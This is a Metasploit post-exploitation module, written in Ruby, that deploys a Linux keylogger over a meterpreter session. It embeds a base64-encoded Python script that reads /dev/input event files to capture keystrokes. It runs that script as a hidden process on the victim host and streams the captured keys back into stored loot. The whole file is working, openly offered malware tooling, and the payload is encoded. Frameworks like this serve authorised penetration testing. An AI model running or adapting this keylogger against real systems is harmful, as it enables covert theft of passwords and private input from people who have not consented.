##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::System

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Keylogger',
      'Description'   => %q{
          Run a keylogger by reading the /dev/input/event* files.
          You should run this as a job.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Eliott Teissonniere' ],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    unless command_exists?("python")
      print_error("No python executable found.")
      return
    end
    print_good("python available")

    loot = store_loot("host.linux.keystrokes", "text/plain", session, "Keystrokes on #{sysinfo['Computer']} - #{Time.now.to_s}\n\n", "keystrokes.txt", "User keystrokes")
    print_good("Logfile is #{loot}")

    # Comes from `base64 external/source/linux/keylogger.py`
    keylogger_cmd = "python -c \"exec 'IyBNZXRhc3Bsb2l0IEZyYW1ld29yazoga2V5bG9nZ2VyIG1vZHVsZSBmb3IgTGludXggc3lzdGVtcwojIENyZWRpdHM6IEVsaW90dCBUZWlzc29ubmllcmUgLSBTdW1tZXIgT2YgQ29kZSAyMDE4CgojIE9uZSBsaW5lcmVkIGluIHBvc3QvbGludXgvZ2F0aGVyL2tleWxvZ2dlci5yYgoKaW1wb3J0IHN0cnVjdAoKZnJvbSBvcyBpbXBvcnQgcG9wZW4KCiMgRmluZCB0aGUgcmlnaHQgZXZlbnQgZmlsZQppbmZpbGVfcGF0aCA9ICIvZGV2L2lucHV0LyIgKyBwb3BlbigiZ3JlcCAtRSAgJ0hhbmRsZXJzfEVWPScgL3Byb2MvYnVzL2lucHV0L2RldmljZXMgfCBncmVwIC1CMSAnRVY9MTIwMDEzJyB8IGdyZXAgLUVvICdldmVudFswLTldKyciKS5yZWFkKClbOi0xXQoKIyBFbmdsaXNoIG9ubHkgQVRNLCBpZiBzb21lb25lIGhhcyBhIHdheSB0byByZXRyaWV2ZSB0aGVtIHdpdGggbm8gcHJpdmlsZWdlcwojIChkdW1wa2V5cyBpcyBub3QgYSBzb2x1dGlvbiBzYWRseSksIEkgYW0gaW50ZXJlc3RlZAprZXltYXBzID0gWwogICAgIlJFU0VSVkVEIiwKICAgICJFU0MiLAogICAgIjEiLAogICAgIjIiLAogICAgIjMiLAogICAgIjQiLAogICAgIjUiLAogICAgIjYiLAogICAgIjciLAogICAgIjgiLAogICAgIjkiLAogICAgIjAiLAogICAgIk1JTlVTIiwKICAgICJFUVVBTCIsCiAgICAiQkFDS1NQQUNFIiwKICAgICJUQUIiLAogICAgIlEiLAogICAgIlciLAogICAgIkUiLAogICAgIlIiLAogICAgIlQiLAogICAgIlkiLAogICAgIlUiLAogICAgIkkiLAogICAgIk8iLAogICAgIlAiLAogICAgIkxFRlRCUkFDRSIsCiAgICAiUklHSFRCUkFDRSIsCiAgICAiRU5URVIiLAogICAgIkxFRlRDVFJMIiwKICAgICJBIiwKICAgICJTIiwKICAgICJEIiwKICAgICJGIiwKICAgICJHIiwKICAgICJIIiwKICAgICJKIiwKICAgICJLIiwKICAgICJMIiwKICAgICJTRU1JQ09MT04iLAogICAgIkFQT1NUUk9QSEUiLAogICAgIkdSQVZFIiwKICAgICJMRUZUU0hJRlQiLAogICAgIkJBQ0tTTEFTSCIsCiAgICAiWiIsCiAgICAiWCIsCiAgICAiQyIsCiAgICAiViIsCiAgICAiQiIsCiAgICAiTiIsCiAgICAiTSIsCiAgICAiQ09NTUEiLAogICAgIkRPVCIsCiAgICAiU0xBU0giLAogICAgIlJJR0hUU0hJRlQiLAogICAgIktQQVNURVJJU0siLAogICAgIkxFRlRBTFQiLAogICAgIlNQQUNFIiwKICAgICJDQVBTTE9DSyIsCiAgICAiRjEiLAogICAgIkYyIiwKICAgICJGMyIsCiAgICAiRjQiLAogICAgIkY1IiwKICAgICJGNiIsCiAgICAiRjciLAogICAgIkY4IiwKICAgICJGOSIsCiAgICAiRjEwIiwKICAgICJOVU1MT0NLIiwKICAgICJTQ1JPTExMT0NLIgpdCgojIEp1c3QgZm9yIHNvbWUgcHJldHR5IHByaW50aW5nIHB1cnBvc2VzCnNoaWZ0ID0gRmFsc2UKbW9kaWZpZXJzID0gWwogICAgIkxFRlRTSElGVCIsCiAgICAiUklHSFRTSElGVCIsCiAgICAiTEVGVENUUkwiLAogICAgIkxFRlRBTFQiCl0KcHJlc3NlZCA9IFtdCgojbG9uZyBpbnQsIGxvbmcgaW50LCB1bnNpZ25lZCBzaG9ydCwgdW5zaWduZWQgc2hvcnQsIHVuc2lnbmVkIGludApGT1JNQVQgPSAnbGxISEknCkVWRU5UX1NJWkUgPSBzdHJ1Y3QuY2FsY3NpemUoRk9STUFUKQoKI29wZW4gZmlsZSBpbiBiaW5hcnkgbW9kZQppbl9maWxlID0gb3BlbihpbmZpbGVfcGF0aCwgInJiIikKCndoaWxlIDE6CiAgICBldmVudCA9IGluX2ZpbGUucmVhZChFVkVOVF9TSVpFKQogICAgCiAgICAodHZfc2VjLCB0dl91c2VjLCB0eXBlLCBjb2RlLCB2YWx1ZSkgPSBzdHJ1Y3QudW5wYWNrKEZPUk1BVCwgZXZlbnQpCgogICAgaWYgKHR5cGUgPT0gMSkgYW5kICh2YWx1ZSA9PSAxIG9yIHZhbHVlID09IDApIDoKICAgICAgICBrZXkgPSAidW5rbm93biAoJWQpIiAlIGNvZGUKICAgICAgICBpZiBjb2RlIDwgbGVuKGtleW1hcHMpIGFuZCBrZXkgPj0gMDoKICAgICAgICAgICAga2V5ID0ga2V5bWFwc1tjb2RlXQoKICAgICAgICBpZiBsZW4oa2V5KSA9PSAxIGFuZCB2YWx1ZSA9PSAxOgogICAgICAgICAgICBpZiBub3Qgc2hpZnQ6IGtleSA9IGtleS5sb3dlcigpCgogICAgICAgICAgICB0b19wcmludCA9ICIiCiAgICAgICAgICAgIGZvciBtb2RpZmllciBpbiBwcmVzc2VkOgogICAgICAgICAgICAgICAgdG9fcHJpbnQgKz0gbW9kaWZpZXIgKyAiICIKICAgICAgICAgICAgcHJpbnQodG9fcHJpbnQgKyBrZXkpCiAgICAgICAgZWxpZiBrZXkgaW4gbW9kaWZpZXJzOgogICAgICAgICAgICBpZiB2YWx1ZSA9PSAwOgogICAgICAgICAgICAgICAgaWYga2V5ID09ICJSSUdIVFNISUZUIiBvciBrZXkgPT0gIkxFRlRTSElGVCI6CiAgICAgICAgICAgICAgICAgICAgc2hpZnQgPSBGYWxzZQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmVzc2VkLnJlbW92ZShrZXkpCiAgICAgICAgICAgIGVsaWYgdmFsdWUgPT0gMToKICAgICAgICAgICAgICAgIGlmIGtleSA9PSAiUklHSFRTSElGVCIgb3Iga2V5ID09ICJMRUZUU0hJRlQiOgogICAgICAgICAgICAgICAgICAgIHNoaWZ0ID0gVHJ1ZQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmVzc2VkLmFwcGVuZChrZXkpCiAgICAgICAgZWxpZiB2YWx1ZSA9PSAwIGFuZCBrZXkgbm90IGluIG1vZGlmaWVycyBhbmQgbGVuKGtleSkgPiAxOgogICAgICAgICAgICBwcmludChrZXkpCgppbl9maWxlLmNsb3NlKCkK'.decode('base64')\""
    
    # We have to reimplement cmd-exec in order to stream
    # the output
    print_status("Starting keylogger")

    session.response_timeout = 15
    process = session.sys.process.execute(keylogger_cmd, "", { "Hidden" => true, "Channelized" => true })

    print_good("Process started")

    while (d = process.channel.read)
      if d == ""
          sleep 0.1 # No timeout, just wait
      else
        # We have something!
        file_local_write(loot, d)
      end
    end

    # Normally we don't reach that part unless
    # the process is killed on the victim side

    begin
      process.channel.close
    rescue IOError => e
      # Nothing to do
    end

    process.close

    print_error("End of process, keylogger may have been killed")
  end
end
